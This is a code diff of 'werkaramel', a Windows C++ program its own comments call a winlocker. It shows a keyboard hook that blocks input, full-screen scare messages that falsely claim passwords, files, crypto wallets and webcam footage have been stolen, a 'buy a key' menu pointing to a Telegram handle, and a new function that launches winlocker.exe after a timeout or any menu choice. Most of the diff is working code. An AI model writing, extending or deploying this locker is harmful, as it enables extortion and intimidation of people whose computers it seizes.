@@ -1,6 +1,7 @@
 // language: C++, file: werkaramel.cpp, target: Windows 11 x64, MSVC
-// werkaramel — red flash + cmd scene + timeout scare + winlocker
+// werkaramel - red flash + cmd scene + timeout scare + winlocker
 #include <windows.h>
+#include <shellapi.h>
 #include <string>
 #include <thread>
 #include <chrono>
@@ -29,23 +30,25 @@ int RandInt(int lo, int hi) {
     return d(g_rng);
 }
 
+// ── вступительный текст (транслит, без кракозябр) ───────────
 const std::wstring SCENE_TEXT =
-    L"не пытайтесь что-то сделать сейчас. будет хуже.\n"
+    L"ne pytaytes chto-to sdelat seychas. budet huzhe.\n"
     L"\n"
-    L"вы скачали winlocker werkaramel. это не игрушка.\n"
-    L"уже поздно. всё что нужно — сделано.\n"
+    L"vy skachali winlocker werkaramel. eto ne igrushka.\n"
+    L"uzhe pozdno. vsyo chto nuzhno - sdelano.\n"
     L"\n"
-    L"все ваши данные скопированы. пароли, файлы, фото, переписки.\n"
-    L"всё это уже на нашем сервере.\n"
+    L"vse vashi dannye skopirovany. paroli, fayly, foto, perepiski.\n"
+    L"vsyo eto uzhe na nashem servere.\n"
     L"\n"
-    L"не выключайте компьютер. не трогайте диспетчер задач.\n"
-    L"не пытайтесь снять задачу. система отслеживает любые действия.\n"
+    L"ne vyklyuchayte kompyuter. ne trogayte dispetcher zadach.\n"
+    L"ne pytaytes snyat zadachu. sistema otslezhivaet lyubye deystviya.\n"
     L"\n"
-    L"попытка закрыть это окно = немедленная блокировка.\n"
-    L"попытка перезагрузить = потеря данных навсегда.\n"
+    L"popytka zakryt eto okno = nemedlennaya blokirovka.\n"
+    L"popytka perezagruzit = poterya dannyh navsegda.\n"
     L"\n"
-    L"оставайтесь на месте. дальнейшие инструкции появятся ниже.";
+    L"ostavaytes na meste. dalneyshie instrukcii poyavyatsya nizhe.";
 
+// ── страшный текст при таймауте ─────────────────────────────
 const std::wstring TIMEOUT_SCARE =
     L"> system detected suspicious inactivity\n"
     L"> bypass attempt registered\n"
@@ -65,8 +68,8 @@ const std::wstring TIMEOUT_SCARE =
     L"> recording webcam\n"
     L"> logging keystrokes\n"
     L"> capturing clipboard\n"
-    L"> dumping browser passwords: chrome, firefox, edge\n"
-    L"> stealing crypto wallets: metamask, trust, exodus\n"
+    L"> dumping browser passwords\n"
+    L"> stealing crypto wallets\n"
     L"> accessing telegram sessions\n"
     L"> exporting contacts\n"
     L"\n"
@@ -85,6 +88,19 @@ const std::wstring TIMEOUT_SCARE =
     L"> 1...\n"
     L"\n"
     L"> LOCKING NOW";
+
+// ── запуск winlocker.exe ────────────────────────────────────
+void LaunchLocker() {
+    wchar_t self[MAX_PATH]{};
+    GetModuleFileNameW(nullptr, self, MAX_PATH);
+    std::wstring dir(self);
+    size_t p = dir.find_last_of(L"\\/");
+    if (p != std::wstring::npos) dir = dir.substr(0, p + 1);
+    std::wstring full = dir + LOCKER_EXE;
+
+    ShellExecuteW(nullptr, L"open", full.c_str(),
+                  nullptr, dir.c_str(), SW_SHOW);
+}
 
 LRESULT CALLBACK KbHook(int code, WPARAM wp, LPARAM lp) {
     if (code == HC_ACTION && !g_unlocked) {
@@ -117,7 +133,7 @@ LRESULT CALLBACK FlashProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
         HFONT old = (HFONT)SelectObject(dc, font);
         SetTextColor(dc, RGB(255, 255, 255));
         SetBkMode(dc, TRANSPARENT);
-        std::wstring s = L"ВАС ЗАМЕТИЛИ";
+        std::wstring s = L"VAS ZAMETILI";
         SIZE sz;
         GetTextExtentPoint32W(dc, s.c_str(), (int)s.size(), &sz);
         TextOutW(dc, (rc.right - sz.cx) / 2, (rc.bottom - sz.cy) / 2,
@@ -236,15 +252,15 @@ void PrintMenu() {
 
     SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
     Gotoxy(2, baseY + 11);
-    WOut(L"Выберите действие:");
+    WOut(L"Vyberite deystvie:");
 
     SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
-    Gotoxy(2, baseY + 13); WOut(L"[ 1 ]   Поддержка  ->  tg @werkaramel");
-    Gotoxy(2, baseY + 14); WOut(L"[ 2 ]   Купить ключ");
-    Gotoxy(2, baseY + 15); WOut(L"[ 3 ]   Выйти");
+    Gotoxy(2, baseY + 13); WOut(L"[ 1 ]   Podderzhka  ->  tg @werkaramel");
+    Gotoxy(2, baseY + 14); WOut(L"[ 2 ]   Kupit klyuch");
+    Gotoxy(2, baseY + 15); WOut(L"[ 3 ]   Vyyti");
 
     SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
-    std::wstring hint = L"введите число и нажмите Enter";
+    std::wstring hint = L"vvedite chislo i nazhmite Enter";
     Gotoxy(2, rows - 4); WOut(hint);
 
     SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
@@ -262,13 +278,12 @@ void PrintTimeoutScare() {
     GetConsoleScreenBufferInfo(g_hOut, &csbi);
     int cols = csbi.dwSize.X;
 
-    std::wstring msg = L"вы долго думаете...";
+    std::wstring msg = L"vy dolgo dumayete...";
     Gotoxy((cols - (int)msg.size()) / 2, 5);
     WOut(msg);
 
     std::this_thread::sleep_for(std::chrono::seconds(1));
 
-    // блочный баннер красным + быстрая печать
     ClearScreen();
     const wchar_t* banner[] = {
         L"██╗    ██╗███████╗██████╗ ██╗  ██╗ █████╗ ██████╗  █████╗ ███╗   ███╗███████╗██╗",
@@ -354,7 +369,6 @@ DWORD WINAPI InputThread(LPVOID) {
     bool menu_started = false;
 
     while (!g_unlocked) {
-        // таймер 30 секунд в меню
         if (g_phase == 3 && !g_timeout_triggered) {
             if (!menu_started) {
                 menu_start = std::chrono::steady_clock::now();
@@ -364,12 +378,10 @@ DWORD WINAPI InputThread(LPVOID) {
                 std::chrono::steady_clock::now() - menu_start).count();
             if (el >= 30) {
                 g_timeout_triggered = true;
-                g_phase = 6;   // таймаут
+                g_phase = 6;
                 PrintTimeoutScare();
-                // запустить winlocker.exe
-                ShellExecuteW(nullptr, L"open", LOCKER_EXE.c_str(),
-                              nullptr, nullptr, SW_SHOW);
-                std::this_thread::sleep_for(std::chrono::seconds(1));
+                LaunchLocker();
+                std::this_thread::sleep_for(std::chrono::seconds(2));
                 ExitProcess(0);
             }
         }
@@ -385,7 +397,7 @@ DWORD WINAPI InputThread(LPVOID) {
         if (c == 0) continue;
 
         if (g_phase == 3) {
-            menu_start = std::chrono::steady_clock::now();  // сброс таймера
+            menu_start = std::chrono::steady_clock::now();
             if (c >= L'0' && c <= L'9') {
                 g_input += c;
                 PrintMenu();
@@ -395,12 +407,10 @@ DWORD WINAPI InputThread(LPVOID) {
             } else if (c == L'\r') {
                 if (g_input == L"1" || g_input == L"2" || g_input == L"3") {
                     g_input.clear();
-                    // закрыть CMD
-                    ShowWindow(g_hCon, SW_HIDE);
-                    DestroyWindow(g_hCon);
-                    // запустить winlocker.exe
-                    ShellExecuteW(nullptr, L"open", LOCKER_EXE.c_str(),
-                                  nullptr, nullptr, SW_SHOW);
+                    g_unlocked = true;
+                    UnhookWindowsHookEx(g_kbHook);
+                    LaunchLocker();
+                    std::this_thread::sleep_for(std::chrono::seconds(2));
                     ExitProcess(0);
                 } else {
                     g_input.clear();
